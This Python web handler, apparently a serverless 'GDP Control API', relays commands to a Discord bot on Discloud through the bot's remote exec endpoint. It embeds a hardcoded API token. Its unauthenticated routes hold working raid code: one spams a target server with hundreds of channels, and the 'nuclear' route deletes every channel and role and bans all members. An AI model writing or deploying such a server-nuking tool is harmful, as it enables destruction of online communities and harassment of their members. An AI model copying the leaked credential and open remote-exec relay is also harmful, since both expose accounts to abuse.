from http.server import BaseHTTPRequestHandler
import json
import os
import requests
from urllib.parse import urlparse
from datetime import datetime

# ==================== CONFIGURAÇÕES ====================

DISCLOUD_TOKEN = os.getenv('DISCLOUD_TOKEN', 'eyJhbGciOiJIUzI1NiJ9.eyJpZCI6IjEyOTcwNzEyNTkzNzY0MjI5NjciLCJrZXkiOiJkMmM5MGQxZDhhODNhMDE5NzBkZjY5OTY1N2Q0In0.l7SDgr5LR7TAXqsr6tgOV9yRcb8Z8mYuwLQwM6u_sJI')
BOT_ID = os.getenv('BOT_ID', '1386082293533249546')
API_BASE = "https://api.discloud.app/v2"

class handler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        """Processa requisições GET"""
        
        # Headers CORS
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, PUT, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, api-token')
        self.end_headers()
        
        # Parsear URL
        parsed = urlparse(self.path)
        path = parsed.path
        
        print(f"\n{'='*60}")
        print(f"📡 REQUISIÇÃO: {datetime.now().strftime('%H:%M:%S')}")
        print(f"📌 Path: {path}")
        print(f"{'='*60}")
        
        # ========== ROTAS ==========
        if path == '/' or path == '/api' or path == '/api/':
            result = self.rota_raiz()
        
        elif path == '/api/test':
            result = self.rota_teste()
        
        elif path == '/api/verificar-token':
            result = self.verificar_token()
        
        elif path == '/api/status':
            result = self.status_bot()
        
        elif path == '/api/info':
            result = self.info_bot()
        
        elif path == '/api/servidores':
            result = self.listar_servidores()
        
        elif path.startswith('/api/gdp/'):
            partes = path.split('/')
            if len(partes) >= 4:
                server_id = partes[3]
                quantidade = partes[4] if len(partes) >= 5 else '100'
                result = self.executar_gdp(server_id, quantidade)
            else:
                result = {"erro": "URL inválida. Use: /api/gdp/ID/QUANTIDADE"}
        
        elif path.startswith('/api/nuclear/'):
            partes = path.split('/')
            if len(partes) >= 4:
                server_id = partes[3]
                result = self.executar_nuclear(server_id)
            else:
                result = {"erro": "URL inválida. Use: /api/nuclear/ID"}
        
        else:
            result = {"erro": "Rota não encontrada"}
        
        self.wfile.write(json.dumps(result, indent=2).encode('utf-8'))
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, PUT, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, api-token')
        self.end_headers()
    
    # ==================== FUNÇÕES DA API DISCLOUD ====================
    
    def _api_request(self, method, endpoint, data=None):
        """Faz requisição para a API da Discloud"""
        
        if not DISCLOUD_TOKEN:
            return {"sucesso": False, "erro": "Token não configurado"}
        
        headers = {'api-token': DISCLOUD_TOKEN}
        url = f"{API_BASE}{endpoint}"
        
        print(f"\n🔄 Enviando para Discloud:")
        print(f"   Método: {method}")
        print(f"   URL: {url}")
        
        try:
            if method == 'GET':
                response = requests.get(url, headers=headers, timeout=10)
            elif method == 'PUT':
                response = requests.put(url, headers=headers, json=data, timeout=10)
            elif method == 'POST':
                response = requests.post(url, headers=headers, json=data, timeout=10)
            else:
                return {"sucesso": False, "erro": f"Método {method} não suportado"}
            
            print(f"   Status: {response.status_code}")
            
            if response.status_code == 200:
                return {"sucesso": True, "dados": response.json()}
            else:
                return {"sucesso": False, "status": response.status_code, "erro": response.text}
                
        except Exception as e:
            return {"sucesso": False, "erro": str(e)}
    
    # ==================== ROTAS ====================
    
    def rota_raiz(self):
        return {
            "nome": "GDP Control API",
            "versao": "8.0",
            "api_discloud": "v2",
            "token": "configurado" if DISCLOUD_TOKEN else "não configurado",
            "bot_id": BOT_ID,
            "endpoints": {
                "testar": "/api/test",
                "verificar_token": "/api/verificar-token",
                "status_bot": "/api/status",
                "info_bot": "/api/info",
                "servidores": "/api/servidores",
                "gdp": "/api/gdp/ID/QUANTIDADE",
                "nuclear": "/api/nuclear/ID"
            }
        }
    
    def rota_teste(self):
        return {
            "status": "online",
            "timestamp": datetime.now().isoformat(),
            "token": "✅" if DISCLOUD_TOKEN else "❌"
        }
    
    def verificar_token(self):
        """GET /user - Verifica se o token é válido"""
        return self._api_request('GET', '/user')
    
    def status_bot(self):
        """GET /app/{appID}/status - Status do bot"""
        return self._api_request('GET', f"/app/{BOT_ID}/status")
    
    def info_bot(self):
        """GET /app/{appID} - Informações do bot"""
        return self._api_request('GET', f"/app/{BOT_ID}")
    
    def listar_servidores(self):
        """Extrai servidores das informações do bot"""
        resultado = self._api_request('GET', f"/app/{BOT_ID}")
        if resultado.get('sucesso'):
            dados = resultado['dados']
            return {
                "sucesso": True,
                "servidores": dados.get('guilds', []),
                "total": len(dados.get('guilds', []))
            }
        return resultado
    
    def executar_gdp(self, server_id, quantidade):
        """PUT /app/{appID}/exec - Executa comando GDP"""
        
        try:
            qtd = min(int(quantidade), 500)
        except:
            qtd = 100
        
        # Comando para executar no bot
        comando = f"""
import asyncio
import discord

async def run():
    guild = bot.get_guild({server_id})
    if not guild:
        print('Servidor não encontrado')
        return
    
    criados = 0
    for i in range(1, {qtd} + 1):
        try:
            nome = f"G.D.P-{{i:03d}}"
            await guild.create_text_channel(nome)
            criados += 1
            await asyncio.sleep(0.5)
        except Exception as e:
            print(f"Erro: {{e}}")
    
    print(f"✅ Criados {{criados}} canais")

asyncio.run(run())
"""
        
        return self._api_request('PUT', f"/app/{BOT_ID}/exec", {"cmd": comando})
    
    def executar_nuclear(self, server_id):
        """PUT /app/{appID}/exec - Executa comando Nuclear"""
        
        comando = f"""
import asyncio
import discord

async def run():
    guild = bot.get_guild({server_id})
    if not guild:
        print('Servidor não encontrado')
        return
    
    # Deletar canais
    for c in guild.channels:
        try:
            await c.delete()
            await asyncio.sleep(0.3)
        except:
            pass
    
    # Deletar cargos
    for r in guild.roles:
        if r.name != "@everyone" and not r.managed:
            try:
                await r.delete()
                await asyncio.sleep(0.3)
            except:
                pass
    
    # Banir membros
    for m in guild.members:
        if m != guild.me:
            try:
                await m.ban(reason="Nuclear via site")
                await asyncio.sleep(1)
            except:
                pass
    
    print("☢️ Nuclear concluído")

asyncio.run(run())
"""
        
        return self._api_request('PUT', f"/app/{BOT_ID}/exec", {"cmd": comando})